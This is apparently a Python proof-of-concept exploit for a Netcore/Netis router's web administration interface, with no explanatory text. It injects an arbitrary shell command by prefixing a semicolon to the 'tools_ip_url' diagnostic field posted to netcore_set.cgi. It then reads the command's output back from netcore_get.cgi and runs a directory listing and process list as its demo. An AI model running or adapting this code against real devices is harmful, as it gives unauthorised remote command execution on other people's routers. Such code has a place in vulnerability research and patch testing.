import requests,json
import re
import time
import urllib

def Two(h,p,cmd):
    host = h +':' + p
    #s2 = one(host)
    headers1={'Host':host,
            'Cache-Control':'no-cache',
            'Content-Type':'application/x-www-form-urlencoded',
            'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36',
            'Accept':'*/*',
            'Origin':'http://59.125.247.178:8888',
            'Referer':'http://'+host+'/index.htm',
            'Accept-Encoding':'gzip,deflate',
            'Accept-Language':'zh-CN,zh;q=0.9',
            'Connection':'close'
             }
    values={'mode_name':'netcore_set',
            'tools_type':1,
            'tools_ip_url':';'+cmd,
            'tools_cmd':1,
            'net_tools_set':1,
            'wlan_idx_num':0
        }
    data=urllib.parse.urlencode(values)
    data=data.replace("+","%20");
    session = requests.session()
    r=session.post(url='http://'+host+'/cgi-bin-igd/netcore_set.cgi',data=data,headers=headers1)
    print(r.text)
    values1={'mode_name':'netcore_set',
            'noneed':'noneed'
        }
    data=urllib.parse.urlencode(values)
    data=data.replace("+","%20");
    r=session.post(url='http://'+host+'/cgi-bin-igd/netcore_get.cgi',data=data,headers=headers1)
    data = json.loads(r.text)
    print(data['tools_results'].replace(";","\n"),len(data['tools_results']))
if __name__ == '__main__':
    Two('x.x.x.x','8888','ls /* -al|ps')
